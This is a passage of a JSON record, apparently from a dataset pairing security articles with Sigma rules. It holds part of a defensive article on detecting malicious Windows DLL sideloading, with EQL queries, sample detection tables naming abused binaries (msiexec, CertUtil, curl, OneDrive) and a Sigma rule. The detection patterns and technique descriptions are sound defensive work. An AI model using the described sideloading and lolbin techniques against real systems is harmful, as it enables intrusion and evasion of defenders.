\"C:\\\\*\"\n```\n\nBelow is an example in which Microsoft OneDrive and Windows Control Panel executables are abused to sideload malicious modules for initial access and execution.\n\n```image\nAlt: Abuse of Microsoft OneDrive\nDescription: The image displays a table containing data related to the execution of processes and the loading of DLLs in a Windows environment. The columns include 'process.executable' showing the path of the executable files, 'process.code_signature.subject_name' indicating the publisher of the process, 'process.name' listing the names of the processes involved, and 'dll.name' indicating the names of the DLLs loaded by these processes. The entries include instances of 'OneDriveStandaloneUpdater.exe' and 'control.exe', along with details about the libraries they loaded, which suggests an analysis of potential DLL side-loading activities.\nTranscription: |\n  | process.executable               | process.code_signature.subject_name | process.name                  | dll.name    |\n  | -------------------------------- | ----------------------------------- | ----------------------------- | ----------- |\n  | D:\\OneDriveStandaloneUpdater.exe | Microsoft Corporation               | OneDriveStandaloneUpdater.exe | version.dll |\n  | D:\\OneDriveStandaloneUpdater.exe | Microsoft Corporation               | OneDriveStandaloneUpdater.exe | version.dll |\n  | D:\\Onedrive_fotos.exe            | Microsoft Corporation               | Onedrive_fotos.exe            | version.dll |\n  | G:\\control.exe                   | Microsoft Windows                   | control.exe                   | edputil.dll |\n```\n\n### DLL from Archive Files\n\nSimilarly to virtual disk images, attackers can also use ZIP/RAR archive files with embedded malicious DLL paired with a trusted binary or a shortcut (LNK) file to gain access.\n\n```image\nAlt: DLL from Archive Files\nDescription: The image displays a code snippet that appears to be a query for identifying suspicious DLLs (Dynamic Link Libraries) based on various criteria. It filters DLLs that are not trusted and checks against specific user IDs while excluding certain processes. The query also includes conditions for identifying DLLs that are extracted to temporary directories from archive files like 7z, RAR, and others. The code is likely used for threat detection in cybersecurity to find potential malicious activities.\nTranscription: |\n  library where\n  dll.code_signature.trusted != true and process.code_signature.trusted == true and\n  not user.id : (\"S-1-5-18\", \"S-1-5-19\", \"S-1-5-20\") and not startswith~(dll.name, process.name) and\n  /* loading dll archive temp extraction path */\n  dll.path :\n  (\"?::\\\\Users\\\\*\\\\Temp\\\\7z*\",\n   \"?::\\\\Users\\\\*\\\\Temp\\\\Rar$*\",\n   \"?::\\\\Users\\\\*\\\\Temp\\\\Temp?_*\",\n   \"?::\\\\Users\\\\*\\\\Temp\\\\BNZ.*\")\n```\n\nThe following screen capture shows how this query identifies a malicious file from a RAR archive which was auto-extracted into a temporary user directory. This scenario is moderately common.\n\n```image\nAlt: Malicious File from RAR Archive\nDescription: The image depicts a screenshot of an Event Query Language (EQL) query used for detecting suspicious DLL files loaded from temporary extraction paths. It shows the details of a process executable located in a user directory, along with the associated DLL name, 'dlmgr.dll'. The highlighted sections indicate the path and names of the involved files, providing insight into how attackers might utilize archived files for malicious purposes.\nTranscription: |\n  EQL query\n  /* loading dll archive temp extraction path */\n  dll.path :\n      (\"?:\\Users\\*\\*\\Temp\\*.dll\")\n      (\"?:\\Users\\*\\*\\Temp\\Rar*\")\n      (\"?:\\Users\\*\\*\\Temp\\BNZ*\")\n  \n  process.executable\n  C:\\Users\\bouss\\AppData\\Local\\Temp\\Rar$Xa14764.33019\\Daily Report(27-6-2022)-(en).exe\n  \n  process.name\n  Daily Report(27-6-2022)-(en).exe\n  \n  dll.name\n  dlmgr.dll\n```\n\n### DLL via Malicious Documents\n\nMicrosoft Office documents can be also used to deploy and load a malicious DLL to avoid spawning a suspicious child process. The following query correlates an executable (PE) file creation event with a DLL load event.\n\n```image\nAlt: DLL via Malicious Documents\nDescription: The image depicts a code snippet that likely represents a query or detection rule used in cybersecurity. It includes programming syntax related to monitoring process actions and file events in a Windows environment. The code specifically looks for certain executable processes (like WINWORD.EXE, EXCEL.EXE, etc.) and correlates them with file extensions typically associated with malicious activity (such as .dll, .cpl, and .ocx). The logic checks for conditions such as trusted code signatures and specific file paths, aiming to detect suspicious behavior related to DLL loading through Microsoft Office applications.\nTranscription: |\n  sequence by process.entity_id with maxspan=1m\n  [file where event.action != \"deletion\" and\n      process.name : (\"WINWORD.EXE\", \"EXCEL.EXE\", \"POWERPNT.EXE\", \"MSACCESS.EXE\") and\n      (file.extension : (\"dll\", \"cpl\", \"ocx\") or file.Ext.header_bytes : \"4d5a*\")\n  ] by file.path\n  [library where\n      process.name : (\"WINWORD.EXE\", \"EXCEL.EXE\", \"POWERPNT.EXE\", \"MSACCESS.EXE\") and\n      not (dll.code_signature.trusted == true and\n          dll.path : \"?\\\\Users\\\\*\\\\appdata\\\\local\\\\assembly\\\\*.dll\") and\n      not dll.path : \"?\\\\Windows\\\\assembly\\\\NativeImages_*.dll\"\n  ] by dll.path\n```\n\nBelow are some examples of malicious Word and Excel documents using this delivery technique.\n\n```image\nAlt: Malicious Word and Excel Documents\nDescription: The image displays a table containing four rows of data related to suspicious DLL file loading events. Each row includes three columns: 'dll.path', which shows the file path of the DLLs; 'rule.name', indicating the rule that triggered the detection, specifically noting that Microsoft Office loaded a dropped executable file; and 'process.name', identifying the associated processes, which include WINWORD.EXE and EXCEL.EXE.\nTranscription: |\n  | dll.path                                                              | rule.name                                         | process.name |\n  | --------------------------------------------------------------------- | ------------------------------------------------- | ------------ |\n  | C:\\Users\\user\\AppData\\Local\\Temp\\msvcr100e.dll                        | Microsoft Office Loaded a Dropped Executable File | WINWORD.EXE  |\n  | C:\\Users\\user\\AppData\\Local\\Microsoft\\ThumbNail\\thumbnail.db          | Microsoft Office Loaded a Dropped Executable File | WINWORD.EXE  |\n  | C:\\Users\\user\\AppData\\Local\\Temp\\icutils.dll                          | Microsoft Office Loaded a Dropped Executable File | WINWORD.EXE  |\n  | C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\Templates\\libReq1.dll | Microsoft Office Loaded a Dropped Executable File | EXCEL.EXE    |\n```\n\n### DLL via MSIEXEC\n\nMsiExec is another great option when you need to execute malicious DLLs because this activity blends in well with legitimate software installers. Two observed delivery methods are:\n\n- Calling the DLLRegisterServer export from a random DLL using the command-line arguments /y or /z as documented here\n- Build an installer that uses custom actions to load and execute a DLL as documented here and here\n\nThe following query can be used to identify the execution of the built-in Windows Installer, MSIEXEC, to call the exported function and run code:\n\n```image\nAlt: MSIEXEC Execution\nDescription: The image displays a code snippet written in a programming or query language, likely intended for monitoring or detecting suspicious activities related to the execution of malicious DLLs using the Windows Installer (MSIEXEC). The code includes several logical conditions to filter events, such as checking for the action type, the original executable name, and various arguments passed to the process. It also specifies criteria to exclude certain legitimate uses, ensuring that only potentially harmful executions are flagged.\nTranscription: |\n  process where event.action == \"start\" and\n  process.pe.original_file_name : \"msiexec.exe\" and process.args : (\"/z\", \"/y\", \"-y\", \"-z\") and\n  not (process.args : (\"?:\\\\Program Files\\\\*.dll\", \"?:\\\\Program Files (x86)\\\\*\") and process.args_count <= 3) and\n  not process.Ext.token.integrity_level_name == \"system\" and\n  not (process.parent.executable : \"?::\\\\Windows\\\\Sys*\\\\msiexec.exe\" and process.parent.args : \"/V\")\n```\n\nExamples where MSI is used to load malicious DLLs:\n\n```image\nAlt: Examples of MSI Loading Malicious DLLs\nDescription: The image displays a detailed log of endpoint process events related to the execution of the Windows Installer (msiexec.exe). It lists various instances where msiexec.exe was invoked, showing the paths of the started processes, the command-line arguments used (such as '-y' and '/y'), and the parent processes from which msiexec was executed. This log serves as an example of how malicious DLLs can be executed through legitimate Windows Installer processes, highlighting the potential for defense evasion in cyber threats.\nTranscription: |\n  message\tevent.category\n  Endpoint process event\tprocess\n  in\tC:\\Users\\user\\AppData\\Local\\Temp\\\tstarted process\t>. msiexec.exe\t(7492)\tC:\\Windows\\System32\\msiexec.exe\t-y\t.\\PcaGX.8\tvia parent process\tfile.exe\t(6492)\n  Endpoint process event\tprocess\n  Host1\tin\tC:\\Users\\user\\AppData\\Local\\Temp\\\tstarted process\t>. msiexec.exe\t(1596)\tmsiexec.exe\t-Y\t.\\UKHPfGlw.UMV\tvia parent process\tcmd.exe\t(9164)\n  Endpoint process event\tprocess\n  Host1\tin\tC:\\Users\\user\\AppData\\Local\\Temp\\\tstarted process\t>. msiexec.exe\t(4196)\tmsiexec.exe\t/y\t.\\7DPLG52t.~\tvia parent process\tcmd.exe\t(6304)\n  Endpoint process event\tprocess\n  in\tC:\\Users\\user\\AppData\\Local\\Temp\\\tstarted process\t>. msiexec.exe\t(7648)\tC:\\Windows\\System32\\msiexec.exe\t/y\t.\\VJCGT.D\tvia parent process\tfile.exe\t(7260)\n  Updated now\n```\n\nDLLs delivered via Windows Installer custom actions can be detected by correlating a DLL file creation event where the calling process is MsiExec and where that DLL is subsequently loaded by the same MsiExec process.\n\nIt's worth noting that there are some legitimate uses of Windows Installer custom actions and this query may require some filtering in environments where those are used.\n\n```image\nAlt: Legitimate Uses of Windows Installer\nDescription: The image displays a code snippet written in a programming or query language, likely used for detecting suspicious activities related to the execution of malicious DLLs via the Windows Installer (MsiExec). It includes a sequence with conditions to identify file creation events, checking for specific header bytes and the process name 'msiexec.exe'. The code also filters for DLLs that are not trusted, indicating a focus on security and threat detection in a Cyber Threat Intelligence context.\nTranscription: |\n  sequence with maxspan=1s\n  [file where event.action : \"creation\" and\n  file.Ext.header_bytes : \"4d5a*\" and process.name : \"msiexec.exe\"] by file.path\n  [library where process.name : \"msiexec.exe\" and\n  dll.code_signature.trusted != true and\n  not dll.path :\n  (\"?:\\\\Windows\\\\Installer\\\\MSI*.tmp\",\n  \"?:\\\\Windows\\\\assembly\\\\NativeImages*\",\n  \"?:\\\\Program Files\\\\*\",\n  \"?:\\\\Program Files (x86)\\\\*\")] by dll.path\n```\n\nThe following query matches the Gwisin Ransomware documented by AhnLab and for which a PoC has been created.\n\n### DLL delivery via lolbins\n\nSome malware relies on trusted Microsoft binaries to download, decode or extract DLLs. This query correlates PE file creation or modification by common built-in tools, followed by an image load.\n\n```image\nAlt: DLL Delivery via lolbins\nDescription: The image displays a code snippet used for detecting suspicious Windows libraries, particularly focusing on DLL delivery via legitimate binaries (lolbins). It shows a sequence query that specifies conditions for identifying files based on the names of common processes and the header bytes of the files, indicating a method for threat detection in cybersecurity.\nTranscription: |\n  sequence with maxspan=5m\n  \n  [file where\n    process.name : (\"MSHTA.EXE\", \"CertUtil.exe\", \"CertReq.exe\", \"tar.exe\", \"curl.exe\", \"xcopy.exe\")\n    and file.Ext.header_bytes : \"4d5a*\" ] by file.path\n  \n  [library true] by dll.path\n```\n\nExamples of malware identified using this detection approach:\n\n```image\nAlt: Examples of Malware Identified\nDescription: The image showcases a data table highlighting suspicious activity related to DLL delivery via legitimate Windows binaries. It displays various columns including 'process.executable', 'process.name', 'dll.name', and 'event.category'. Each row details instances where certain executables, such as 'curl.exe' and 'tar.exe', created or loaded DLL files, indicating potential malware behavior. Notable entries show the loading of libraries like 'secur32.dll' and 'node.dll' via common tools, which aligns with the context of detecting malicious DLL usage for execution and defense evasion.\nTranscription: |\n  process.executable                     process.name      dll.name          event.category\n  C:\\Windows\\System32\\curl.exe          curl.exe          —                 file\n  C:\\Users\\bouss\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe OneDrive.exe   secur32.dll      library\n                                        loaded library via >. OneDrive.exe (38076)\n  C:\\Windows\\System32\\tar.exe           tar.exe           —                 file\n  C:\\Users\\bouss\\AppData\\Roaming\\Healthy\\Healthy.exe Healthy.exe      node.dll         via >. tar.exe (15176)\n                                        loaded library via >. Healthy.exe (25376)\n  C:\\Windows\\System32\\xcopy.exe         xcopy.exe         —                 file\n  LAPTOP-JU4M310E @ LAPTOP-JU4M310E     created a file    paragliding.dat   in C:\\Users\\bouss\\AppData\\Local\\Temp\\paragliding.dat\n                                        via >. xcopy.exe\n  C:\\Windows\\System32\\rundll32.exe      rundll32.exe      paragliding.dat   library\n                                        loaded library via >. rundll32.exe (27172)\n```\n\n### DLL sideload into existing program\n\nThe following detection identifies attempts to load a recently-created and unsigned DLL file by an already existing signed process within the same current directory. Comparing the difference between the creation time of the existing program and the DLL creation time we can spot these kinds of anomalies.\n\n```image\nAlt: DLL Sideload into Existing Program\nDescription: The image displays a code snippet written in a programming or query language, likely related to detecting suspicious DLL sideloading activity within Windows processes. It includes comments explaining the conditions for identifying such activities, such as checking for unsigned DLLs being loaded by trusted executable processes, and criteria regarding file creation and modification times. The overall structure suggests it's part of a detection logic for cybersecurity analysis.\nTranscription: |\n  sequence by process.entity_id with maxspan=1m\n  [process where event.action == \"start\" and\n      /* sideloading an unsigned DLL into a signed PE */\n      process.code_signature.trusted == true and\n      /* commonly users writable folders */\n      process.executable !: (\"?:\\\\ProgramData\\\\*.exe\", \"?:\\\\Users\\\\*.exe\") and\n      /*\n      existing program with a creation time of at least 30 days old\n      and not modified in the last 24 hours (e.g. updates)\n      */\n      process.Ext.relative_file_creation_time >= 2592000 and\n      process.Ext.relative_file_name_modify_time > 172800]\n  \n  [library where\n      /* DLL creation time equal or less than 48 hrs */\n      dll.Ext.relative_file_creation_time <= 172800 and\n      not dll.code_signature.status in (\"trusted\", \"errorExpired\", \"errorCode_endpoint*\") and\n      process.executable !: (\"?:\\\\ProgramData\\\\*.exe\", \"?:\\\\Users\\\\*.exe\") and\n      /* dll.path is the same as the process.executable current directory */\n      endsWith~(substring(dll.path, 0, length(dll.name) + 1),\n      substring(process.executable, 0, (length(process.name) + 1)))\n  ]\n```\n\nThe next example matches when the malicious secure32.dll process (created 28 seconds ago) is written to the current OneDrive directory and automatically loaded by OneDrive.exe (created 2.5 years ago):\n\n```image\nAlt: Malicious secure32.dll Process\nDescription: The image depicts a detailed log or table that outlines the execution and loading of a suspicious DLL file (secure32.dll) by an existing signed process (OneDrive.exe). It highlights the relative creation times of both the DLL and the process, showcasing a possible DLL sideloading technique. The different processes and their relationships are indicated, with relevant paths and timestamps, making it easy to understand the context of the potential defense evasion.\nTranscription: |\n  process.Ext.relative_file_creation_time: 80851157.8874452\n  dll.Ext.relative_file_creation_time: 28\n  process.executable: C:\\Users\\bouss\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\n  process.name: OneDrive.exe\n  dll.name: secur32.dll\n  event.category: process\n  \n  - started process: OneDrive.exe (38076) via parent process: explorer.exe (33456)\n  - loaded library via: OneDrive.exe (38076)\n  - loaded library: OneDriveStandaloneUpdater.exe (3912) via parent process: OneDrive.exe (38076)\n  - loaded library: secur32.dll\n```\n\n### DLL loading from suspicious directories\n\nDropping a DLL to a user-writable directories and side loading that with a trusted binary is also a common pattern. The following query looks for this behavior and, by leveraging relative creation and modification times, it can reduce the alerts volume while limiting those to a time window following initial execution.\n\n```image\nAlt: DLL Loading from Suspicious Directories\nDescription: The image displays a code snippet written in a programming or query language, focusing on the detection of suspicious DLL loading behavior. It includes comments that describe the criteria for identifying potentially malicious DLL files based on various conditions: whether the DLL is loaded by a signed process, created or modified recently, and located in suspicious directories. The list of suspicious paths includes common user-writable locations like `PerfLogs`, `Pictures`, and `Documents`, among others. The syntax suggests that it is designed for query execution in a security context, potentially for monitoring or threat detection.\nTranscription: |\n  library where\n  \n  /* loaded by a signed process */\n  process.code_signature.trusted == true and\n  \n  /* DLL created or modified within 15mins before its loaded (reduces alerts volume) */\n  (dll.Ext.relative_file_creation_time <= 500 or dll.Ext.relative_file_name_modify_time <= 500) and\n  not dll.code_signature.status : (\"trusted\", \"errorExpired\", \"errorCode_endpoint*\", \"errorChaining\") and\n  \n  /* Suspicious Paths */\n  dll.path ( \"?::\\PerfLogs\\*.dll\",\n  \"?::\\Users\\*\\Pictures\\*.dll\",\n  \"?::\\Users\\*\\Music\\*.dll\",\n  \"?::\\Users\\Public\\*.dll\",\n  \"?::\\Users\\*\\Documents\\*.dll\",\n  \"?::\\Windows\\Tasks\\*.dll\",\n  \"?::\\Windows\\System32\\Tasks\\*.dll\",\n  \"?::\\Intel\\*.dll\",\n  \"?::\\AMD\\Temp\\*.dll\",\n  \"..........................\",\n  \"?::\\Windows\\Globalization\\*.dll\",\n  \"?::\\Windows\\L2Schemas\\*.dll\",\n  \"?::\\Windows\\LiveKernelReports\\*.dll\",\n  \"?::\\Windows\\ModemLogs\\*.dll\",\n  \"?::\\Windows\\ImmersiveControlPanel\\*.dll\",\n  \"?::\\$Recycle.Bin\\*.dll\") and\n  \n  /* DLL loaded from the process.executable current directory */\n  endswith~(substring(dll.path, 0, length(dll.path) - (length(dll.name) + 1)),\n  substring(process.executable, 0, length(process.executable) - (length(process.name) + 1)))\n```\n\nThe most commonly-targeted user-writable directories are `?:\\Users\\Public` and `?:\\ProgramData`. The full query containing more than 70 suspicious folders can be found here.\n\nBelow see a example depicting malicious matches where various trusted binaries were abused to load malicious DLLs:\n\n```image\nAlt: Malicious Matches\nDescription: The image is a table displaying information related to DLL loading activities in a Windows environment. It includes columns for 'dll.Ext.relative_file_creation_time', 'process.executable', 'process.name', 'dll.name', and 'event.category'. The table lists specific instances of DLLs being loaded from various executables, with highlighted entries indicating suspicious libraries (e.g., 'colorui.dll' and 'dlmgr.dll') being loaded by processes like 'colorcpl.exe' and 'Dism.exe'. This data is relevant for identifying potentially malicious activities through DLL side-loading.\nTranscription: |\n  | dll.Ext.relative_file_creation_time | process.executable                       | process.name | dll.name    | event.category |\n  | ----------------------------------- | ---------------------------------------- | ------------ | ----------- | -------------- |\n  | 0.6289104                           | C:\\ProgramData\\PackageColor\\colorcpl.exe | colorcpl.exe | colorui.dll | library        |\n  | 29.6725403                          | C:\\ProgramData\\PackageColor\\colorcpl.exe | colorcpl.exe | colorui.dll | library        |\n  | 14.2329503                          | C:\\Users\\Public\\aaa\\Dism.exe             | Dism.exe     | dlmgr.dll   | library        |\n  | 14.2564573                          | C:\\Users\\Public\\aaa\\Dism.exe             | Dism.exe     | dlmgr.dll   | library        |\n```\n\n```image\nAlt: More Malicious Matches\nDescription: The image contains a tabular data display showing details related to DLL (Dynamic Link Library) loading in a cybersecurity context. It features columns with headers such as 'dll.code_signature.exists', 'process.code_signature.subject_name', 'dll.path', and 'process.executable'. The rows illustrate entries showing the status of the DLL signature, the associated process names, and the paths to the loaded libraries. This is relevant for detecting suspicious activity involving DLLs in user-writable directories, particularly indicating potential defense evasion tactics.\nTranscription: |\n  | dll.code_signature.exists | process.code_signature.subject_name | dll.path                                    | process.executable                                            |\n  | ------------------------- | ----------------------------------- | ------------------------------------------- | ------------------------------------------------------------- |\n  | false                     | Microsoft Corporation               | C:\\ProgramData\\LG\\Smart\\Backups\\msimg32.dll | C:\\ProgramData\\LG\\Smart\\Backups\\Silverlight.Configuration.exe |\n  | false                     | Remote Utilities LLC                | C:\\ProgramData\\LG\\Smart\\Backups\\msimg32.dll | C:\\ProgramData\\LG\\Smart\\Backups\\wuapihost.exe                 |\n```\n\n### DLL load with a abnormal creation time\n\nAnother interesting scenario is identifying a DLL load event where the DLL has a suspicious creation time, and which could be a result of timestomping. This query compares inconsistencies between the creation time and filename modification time using `dll.Ext.relative_file_name_modify_time` and `dll.Ext.relative_file_creation_time` immediately followed by an image load:\n\n```image\nAlt: DLL Load with Abnormal Creation Time\nDescription: The image depicts a code snippet related to the detection of suspicious DLL loading events in a Windows environment. The code uses a query language to identify DLL files based on specific criteria, such as abnormal creation times and modifications, particularly focusing on directories where malware is likely to drop DLLs. It includes various conditional statements that filter file paths, executable processes, and timestamp comparisons to enhance detection capabilities against timestomping techniques.\nTranscription: |\n  sequence with maxspan=5m\n  [file where event.action == \"creation\" and file.Ext.header_bytes : \"4d5a*\"\n  and\n  not user.id : \"S-1-5-18\" and\n  \n  /*commonly trusted native directories */\n  file.path :\n      \"?:\\\\Windows\\\\system32\\\\*\",\n      \"?:\\\\Windows\\\\SysWOW64\\\\*\",\n      \"?:\\\\Program Files\\\\Microsoft\\\\*\",\n      \"?:\\\\Program Files (x86)\\\\Microsoft\\\\*\",\n      \"?:\\\\Users\\\\Public\\\\*\",\n      \"?:\\\\ProgramData\\\\*\",\n      \"?:\\\\Program Files\\\\Google\\\\Chrome\\\\*.dll\",\n      \"?:\\\\Program Files\\\\Mozilla Firefox\\\\*.dll\" and\n  \n  not process.executable :\n      \"?:\\\\Windows\\\\system32\\\\msiexec.exe\",\n      \"?:\\\\Windows\\\\SysWOW64\\\\msiexec.exe\",\n      \"?:\\\\Windows\\\\system32\\\\rundll32.exe\",\n      \"?:\\\\Windows\\\\SysWOW64\\\\rundll32.exe\",\n      \"?:\\\\Program Files (x86)\\\\*\",\n      \"?:\\\\Program Files\\\\*\",\n      \"?:\\\\Windows\\\\System32\\\\DriverStore\\\\FileRepository\\\\*.exe\"] by file.path as event0\n  \n  [library where\n  \n  /* set to 6 months, malwares often spoof creation times to at least\n  1 year old but can be adjusted to your hunting needs */\n  dll.Ext.relative_file_creation_time >= 15778476 and\n  \n  /* modified last 5m */\n  dll.Ext.relative_file_name_modify_time <= 300 and\n  not dll.code_signature.status : (\"trusted\", \"errorExpired\", \"errorCode_endpoint*\") and\n  process.pid != 4 and\n  \n  dll.path :\n      \"?:\\\\Windows\\\\system32\\\\*\",\n      \"?:\\\\Windows\\\\SysWOW64\\\\*\",\n      \"?:\\\\Program Files\\\\Microsoft\\\\*\",\n      \"?:\\\\Program Files (x86)\\\\Microsoft\\\\*\",\n      \"?:\\\\Users\\\\Public\\\\*\",\n      \"?:\\\\ProgramData\\\\*\",\n      \"?:\\\\Program Files\\\\Google\\\\Chrome\\\\*.dll\",\n      \"?:\\\\Program Files\\\\Mozilla Firefox\\\\*.dll\" and\n  \n  not startswith(dll.path,\n      \"?:\\\\Windows\\\\system32\\\\\",\n      \"?:\\\\Program Files (x86)\\\\*\",\n      \"?:\\\\Program Files\\\\Microsoft\\\\*\",\n      \"?:\\\\Program Files\\\\Internet Explorer\\\\*\",\n      \"?:\\\\Program Files\\\\Google\\\\Chrome\\\\*\",\n      \"?:\\\\Program Files\\\\Mozilla Firefox\\\\*.exe\") by dll.path\n```\n\nThe following is an example where malware drop DLLs in trusted directories and then use timestomping to ensure those DLLs blend in with existing files in those directories:\n\n```image\nAlt: Timestomping Example\nDescription: The image depicts a table displaying log data related to DLL load events, including details such as file paths, modification times, creation times, event actions, and user names. Each row represents a different DLL along with corresponding timestamps and the actions taken (creation or loading) by specific user accounts on the system. The format emphasizes the analysis of suspicious DLL activities, aiding in the detection of potential malware behavior like timestomping.\nTranscription: |\n  | file.path                                              | dll.Ext.relative_file_name_modify_time | dll.Ext.relative_file_creation_time | event.action | user.name |\n  | ------------------------------------------------------ | -------------------------------------- | ----------------------------------- | ------------ | --------- |\n  | C:\\Windows\\SysWOW64\\shervans.dll                       | shervans.dll                           | 0.5604823                           | creation     | user      |\n  |                                                        |                                        | 39287513.8909261                    | load         | user      |\n  | C:\\ProgramData\\Microsoft\\Crypto\\log.dll                | log.dll                                | 5.9438293                           | creation     | user      |\n  |                                                        |                                        | 39293148.4973192                    | load         | user      |\n  | C:\\Windows\\SysWOW64\\FastUserSwitchingCompatibility.dll | FastUserSwitchingCompatibility.dll     | 0.2705282                           | creation     | SYSTEM    |\n  |                                                        |                                        | 578131643.550086                    | load         | SYSTEM    |\n```\n\n### DLL from removable device\n\nDLL side-loading from a removable device is still a valid infection vector, especially for air-gapped networks. An example was recently shared by Mandiant involving an espionage-oriented threat. The following EQL query can be used to find similar behavior:\n\n```image\nAlt: DLL from Removable Device\nDescription: The image displays a code snippet written in a programming or query language, likely used for detecting suspicious DLL (Dynamic Link Library) files from removable devices. The code includes comments that explain the criteria being checked, such as whether the device is a USB type and whether the DLL has an unsigned or untrusted code signature. This type of query is relevant in the context of threat detection and analysis, particularly for identifying potential security threats from removable media.\nTranscription: |\n  library where\n  /* device type is a removable media */\n  (dll.Ext.device.bus_type : \"usb\" or dll.Ext.device.product_id : \"USB *\") and\n  /* unsigned or untrusted code signature */\n  not dll.code_signature.status : (\"trusted\", \"errorExpired\", \"errorCode_endpoint*\", \"errorChaining\")\n```\n\nHere is an example with several matches:\n\n```image\nAlt: Matches from Removable Device\nDescription: The image displays a table containing data related to DLL files detected from a removable device. It includes columns for `dll.path`, `process.executable`, `dll.Ext.device.bus_type`, `dll.Ext.device.product_id`, `dll.Ext.device.serial_number`, `dll.Ext.device.vendor_id`, `event.category`, and `dll.hash.md5`. Each row presents information about various DLL files, highlighting their paths, associated processes, device details, and MD5 hashes, indicating potential suspicious activity related to DLL side-loading.\nTranscription: |\n  | dll.path                                       | process.executable                                  | dll.Ext.device.bus_type | dll.Ext.device.product_id | dll.Ext.device.serial_number | dll.Ext.device.vendor_id | event.category | dll.hash.md5                     |\n  | ---------------------------------------------- | --------------------------------------------------- | ----------------------- | ------------------------- | ---------------------------- | ------------------------ | -------------- | -------------------------------- |\n  | F:\\autorun.inf\\Protection for Autorun\\u2ec.dll | F:\\autorun.inf\\Protection for Autorun\\USB Drive.exe | Usb                     | DataTraveler 3.0          | EE03DB515BE9                 | Kingston                 | library        | 7753da1d7466f251b60673841a97ac5a |\n  | F:\\u2ec.dll                                    | F:\\USB Drive.exe                                    | Usb                     | DataTraveler 3.0          | EE03DB515BE9                 | Kingston                 | library        | 7753da1d7466f251b60673841a97ac5a |\n  | F:\\u2ec.dll                                    | F:\\USB Drive.exe                                    | Usb                     | DataTraveler 3.0          | EE03DB515BE9                 | Kingston                 | library        | 7753da1d7466f251b60673841a97ac5a |\n  | F:\\u2ec.dll                                    | F:\\USB Drive.exe                                    | Usb                     | DataTraveler 3.0          | EE03DB515BE9                 | Kingston                 | library        | 7753da1d7466f251b60673841a97ac5a |\n  | F:\\u2ec.dll                                    | F:\\USB Drive.exe                                    | Usb                     | DataTraveler 3.0          | EE03DB515BE9                 | Kingston                 | library        | 7753da1d7466f251b60673841a97ac5a |\n  | F:\\u2ec.dll                                    | F:\\USB Drive.exe                                    | Usb                     | DataTraveler 3.0          | EE03DB515BE9                 | Kingston                 | library        | 7753da1d7466f251b60673841a97ac5a |\n```\n\n### Protection Rules\n\nElastic provides significant capabilities for identifying unusual or malicious library load events with existing behavior protection rules that take advantage of Windows Libraries events:\n\n- NTDLL Loaded from an Unusual Path\n- Suspicious NTDLL Image Load\n- DLL Loaded from an Archive File\n- Microsoft Office Loaded a Dropped Executable File\n- Suspicious ImageLoad from an ISO Mounted Device\n- Potential Evasion via Oversized Image Load\n- Suspicious ImageLoad via Windows Update Auto Update Client\n- Privilege Escalation via Microsoft Exchange DLL Hijacking\n- Potential DLL SideLoad via a Microsoft Signed Binary\n- Potential DLL SideLoad via a Renamed Signed Binary\n- Library Load of a File Written by a Signed Binary Proxy\n- Potential DLL Search Order Hijacking of an Existing Program\n- Suspicious DLLRegisterServer Execution via MSIEXEC\n- ImageLoad of a File dropped via SMB\n- RunDLL32/Regsvr32 Loads Dropped Executable\n- Unusual DLL Extension Loaded by Rundll32 or Regsvr32\n- RunDLL32/Regsvr32 Loads a DLL Downloaded via BITS\n- Potential Initial Access via DLL Search Order Hijacking\n- Suspicious Control Panel DLL Loaded by Explorer\n- Protected Process Light Bypass via DLL Tampering\n- Potential Privilege Escalation via DLL Redirection\n- Potential Privilege Escalation via Missing DLL\n- Potential Privilege Escalation via Elevated IFileOperation\n- Suspicious DLL Loaded by Svchost\n- Suspicious DLL Loaded from a Removable Media\n- Suspicious Control Panel DLL Loaded by Explorer\n- Dynwrapx Image Load via Windows Scripts\n- Suspicious Image Load via Windows Scripts\n- Potential Image Load with a Spoofed Creation Time\n\n## Conclusion\n\nCompared to detections that rely on process execution events and where adversaries expose more detection opportunities via command-line flags and parent process relationships, designing detections based on DLL events requires more enrichment and correlation to decrease noise rate and increase confidence.\n\nIn this publication we shared numerous examples of how we’re using DLL events to identify threats. You can use the different capabilities Elastic endpoint offers to produce higher signal alerts, too. Given the multitude of methods of delivering malicious code as DLLs, though, relying on behavioral detections alone is not enough. Combining this logic with malware file classification, shellcode detection features, and user-entity based analytics (UEBA) improves the fidelity of this metadata for detection purposes.",
    "sigma_rule": {
      "title": "Unsigned DLL Loaded by Windows Utility",
      "id": "b5de0c9a-6f19-43e0-af4e-55ad01f550af",
      "status": "test",
      "description": "Detects windows utilities loading an unsigned or untrusted DLL.\nAdversaries often abuse those programs to proxy execution of malicious code.\n",
      "references": [
        "https://www.elastic.co/security-labs/Hunting-for-Suspicious-Windows-Libraries-for-Execution-and-Evasion",
        "https://akhere.hashnode.dev/hunting-unsigned-dlls-using-kql",
        "https://unit42.paloaltonetworks.com/unsigned-dlls/?web_view=true"
      ],
      "author": "Swachchhanda Shrawan Poudel",
      "date": "2024-02-28",
      "modified": "2024-03-07",
      "tags": [
        "attack.t1218.011",
        "attack.t1218.010",
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "category": "image_load"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\InstallUtil.exe",
            "\\RegAsm.exe",
            "\\RegSvcs.exe",
            "\\regsvr32.exe",
            "\\rundll32.exe"
          ]
        },
        "filter_main_signed": {
          "Signed": "true"
        },
        "filter_main_sig_status": {
          "SignatureStatus": [
            "errorChaining",
            "errorCode_endpoint",
            "errorExpired",
            "trusted"
          ]
        },
        "filter_main_signed_null": {
          "Signed": null
        },
        "filter_main_signed_empty": {
          "Signed": [
            "",
            "-"
          ]
        },
        "filter_main_sig_status_null": {
          "SignatureStatus": null
        },
        "filter_main_sig_status_empty": {
          "SignatureStatus": [
            "",
            "-"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_susp_unsigned_dll.yml"
  },
  "15": {
    "url": "https://any.run/report/cf0de0c3ff0e337e47088e11c0867dda9709eaafa0a1c095c132e9b87722158e/34221348-072d-4b70-93f3-aa71f6ebecad/",
